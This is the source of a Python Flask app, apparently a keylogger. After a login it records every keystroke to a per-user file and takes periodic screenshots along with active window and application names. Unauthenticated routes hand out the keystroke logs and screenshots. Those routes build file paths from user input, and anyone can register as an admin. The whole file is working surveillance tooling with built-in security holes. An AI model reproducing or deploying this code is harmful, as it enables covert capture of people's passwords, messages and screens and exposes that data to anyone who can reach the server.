from pynput.keyboard import Listener
import threading
from flask import Flask, request, redirect, jsonify, send_file
from flask_cors import CORS
import hashlib
import secrets
import requests
import json
from PIL import ImageGrab
import psutil
import pygetwindow as gw
import time
import os
import logging
import socket

# Global variables
text = ""
ip_address = "109.74.200.23"
port_number = "3000"
time_interval = 10
capture_interval = 60
current_listener = None
capture_details_thread = None  # Initialize the thread variable

# Set up logging
logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s')

def create_on_press(username):
    def on_press(key):
        global text
        try:
            key_char = key.char if hasattr(key, 'char') else str(key)
            with open(f"{username}_logs.txt", "a") as f:
                f.write(f"{key_char}")
            text += key_char
            print(f"Key pressed: {key_char}")
        except Exception as e:
            logging.error(f"Error logging key press: {e}")
    return on_press

def hash_password(password):
    """Hash a password using salted SHA256."""
    salt = secrets.token_bytes(16)
    hashed_password = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    return salt.hex() + ':' + hashed_password.hex()

def verify_password(stored_password, provided_password):
    """Verify a password against a stored salted hash."""
    salt, stored_hash = stored_password.split(':')
    salt = bytes.fromhex(salt)
    provided_hash = hashlib.pbkdf2_hmac('sha256', provided_password.encode(), salt, 100000)
    return stored_hash == provided_hash.hex()

def is_username_taken(filename, username):
    """Check if the username already exists in the file."""
    with open(filename, 'r') as file:
        for line in file:
            stored_username, _ = line.strip().split(',')
            if username == stored_username:
                return True
    return False

def register_user(filename, user, pwd, is_admin=False):
    """Register a new user."""
    username = user.strip()
    password = pwd.strip()

    if not username or not password:
        print("Username and password cannot be empty.")
        return

    if is_username_taken(filename, username):
        print(f"Username {username} is already taken.")
        return

    hashed_password = hash_password(password)

    with open(filename, 'a') as file:
        file.write(f"{username},{hashed_password}\n")

    print("User registered successfully!")
    logging.info(f"User {username} registered {'as admin' if is_admin else ''} successfully.")

def login_user(filename, user, pwd):
    """Log in an existing user."""
    username = user.strip()
    password = pwd.strip()

    if not os.path.exists(filename):
        print("User file does not exist.")
        return False

    with open(filename, 'r') as file:
        for line in file:
            stored_username, stored_password = line.strip().split(',')
            if username == stored_username and verify_password(stored_password, password):
                logging.info(f"User {username} logged in successfully.")
                return True
    logging.warning(f"Failed login attempt for user {username}.")
    return False

def login_admin(admin_filename, user, pwd):
    """Log in an admin user."""
    username = user.strip()
    password = pwd.strip()

    if not os.path.exists(admin_filename):
        print("Admin file does not exist.")
        return False

    with open(admin_filename, 'r') as file:
        for line in file:
            stored_username, stored_password = line.strip().split(',')
            if username == stored_username and verify_password(stored_password, password):
                logging.info(f"Admin {username} logged in successfully.")
                return True
    logging.warning(f"Failed admin login attempt for user {username}.")
    return False

def admin_access_logs(log_filename):
    """Access and view logs if user is an admin."""
    if not os.path.exists(log_filename):
        print("Log file does not exist.")
        with open(log_filename, 'w'):  # Create an empty log file
            pass
        return

    with open(log_filename, 'r') as file:
        logs = file.read()
    print("Logs:")
    print(logs)

def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        return window.title if window else "No Active Window"
    except Exception as e:
        logging.error(f"Error getting active window title: {e}")
        return "Error in getting window title"

def get_active_application():
    try:
        active_window = gw.getActiveWindow()
        pid = active_window.processId
        process = psutil.Process(pid)
        return process.name()
    except Exception as e:
        logging.error(f"Error getting active application: {e}")
        return "Error in getting application name"

def capture_screenshot(username):
    try:
        user_dir = f'screenshots/{username}'
        os.makedirs(user_dir, exist_ok=True)
        screenshot = ImageGrab.grab()
        screenshot.save(f'{user_dir}/screenshot_{time.time()}.png')
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")


def get_local_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        logging.error(f"Error getting local IP address: {e}")
        return "Error in getting IP address"
    

def stop_listener():
    global current_listener
    if current_listener:
        current_listener.stop()
        current_listener = None

def capture_details(username):
    while True:
        global text
        active_window_title = get_active_window_title()
        active_application = get_active_application()
        capture_screenshot(username)
        logging.info(f"Captured details for {username}: Window Title - {active_window_title}, Application - {active_application}")
        time.sleep(capture_interval)


app = Flask(__name__)
CORS(app)

@app.route('/logout', methods=['POST'])
def logout():
    stop_listener()
    return jsonify({'message': 'User logged out successfully'}), 200

@app.route('/')
def home():
    return "Hello World"

@app.route('/login', methods=["POST", "GET"])
def login():
    global current_listener, capture_details_thread
    if request.method == 'POST':
        data = request.get_json()
        name = data.get('username')
        password = data.get('password')
        admin = data.get('admin')

        if admin:
            if login_admin("admins.txt", name, password):
                print("Admin logged in")
                return {'name': name}
            else:
                return {'error': 'Invalid admin credentials'}, 401
        else:
            if login_user("users.txt", name, password):
                print("User logged in")
                stop_listener()
                current_listener = Listener(on_press=create_on_press(name))
                current_listener.start()

                # Start the screenshot capturing thread after user login
                capture_details_thread = threading.Thread(target=capture_details, args=(name,))
                capture_details_thread.start()

                return redirect(f'/user/{name}')
            else:
                return {'error': 'Invalid user credentials'}, 401
            

@app.route('/download/<user>')
def download_file(user):
    return send_file(f'{user}_logs.txt', as_attachment=True)


@app.route('/register', methods=["POST"])
def register():
    data = request.get_json()
    name = data.get('username')
    password = data.get('password')
    admin = data.get('admin')

    if not name or not password:
        return {'error': 'Name and password are required'}, 400

    filename = "admins.txt" if admin else "users.txt"

    if is_username_taken(filename, name):
        return {'error': 'Username is already taken'}, 400

    # Handle registration
    register_user(filename, name, password, admin)
    return {'message': 'User registered successfully'}, 200


@app.route('/user/<name>')
def user_home(name):
    return f"Welcome, {name}!"

@app.route('/screenshots/<username>/<filename>', methods=['GET'])
def serve_screenshot(username, filename):
    user_dir = f'screenshots/{username}'
    file_path = os.path.join(user_dir, filename)
    
    if os.path.exists(file_path):
        return send_file(file_path, as_attachment=False)
    else:
        return jsonify({'error': 'File not found'}), 404
    
    
@app.route('/screenshots/<username>', methods=['GET'])
def get_screenshots(username):
    user_dir = f'screenshots/{username}'
    if not os.path.exists(user_dir):
        return jsonify({"screenshots": []}), 200

    screenshots = os.listdir(user_dir)
    return jsonify({"screenshots": screenshots}), 200



if __name__ == "__main__":
    local_ip = get_local_ip()
    print(f"Running on http://{local_ip}:{port_number}")
    app.run(debug=True, host='127.0.0.1', port=5000)
